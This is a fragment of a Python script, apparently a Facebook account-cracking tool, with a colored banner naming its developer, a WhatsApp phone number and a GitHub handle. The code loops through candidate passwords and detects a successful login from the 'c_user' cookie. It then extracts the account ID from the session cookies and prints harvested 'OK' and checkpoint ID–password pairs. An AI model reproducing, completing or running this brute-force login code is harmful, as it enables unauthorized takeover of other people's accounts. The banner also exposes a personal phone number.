...
\033[1;93m______________________________________________________
 ...
 \033[1;93m(*)\033[1;92m Developer : Md. Alamin Islam
 \033[1;93m(*)\033[1;92m WhatsApp  : +8801915935712
 \033[1;93m(*)\033[1;92m Version   : 2.0
 \033[1;93m(*)\033[1;92m Github    : ALAMIN-XD89 
\033[1;93m______________________________________________________
"""    
loop = 0
oks = []
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('     \033[1;32m[SKB-OK] '+cid+' | '+ps+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('     \033[1;33m[zSKB-CP] '+cid+' | '+ps+'\033[0;97m')
